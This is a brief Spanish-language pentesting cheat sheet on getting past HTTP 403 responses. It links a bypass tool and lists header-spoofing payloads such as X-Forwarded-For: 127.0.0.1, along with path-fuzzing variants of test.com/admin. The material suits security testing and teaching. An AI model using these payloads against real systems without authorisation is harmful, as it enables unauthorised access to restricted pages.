
### Tool para hacer bypass a errores 403 --> https://github.com/iamj0ker/bypass-403


Antes de probar los otros métodos es recomendable probar cambiar el método ***HTTP*** por GET, ***POST***, ***PATCH***, ***OPTIONS***, ***TRACE***…


## 1º Método ***Fuzzing*** a cabeceras ***HTTP***

En algunos casos acceder a páginas o a ficheros se puede hacer cambiando la cabecera de la petición incluyendo una dirección interna como por ejemplo:

- X-ProxyUser-Ip: 127.0.0.1
- Client-IP: 127.0.0.1
- Host: localhost
- X-Originating-IP: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-Real-IP: 127.0.0.1

## 2º Método ***Path Fuzzing***

Se pueden hacer cambios a la URL haciendo uso de caracteres especiales o encodeando en HTML:

- test.com/admin/*
- test.com/*admin/
- test.com/%2fadmin/
- test.com%2fadmin%2f
- test.com/./admin/
- test.com//admin/./
- test.com///admin///
- test.com//admin//
- test.com/ADMIN/
- test.com/;/admin/
- test.com//;//admin/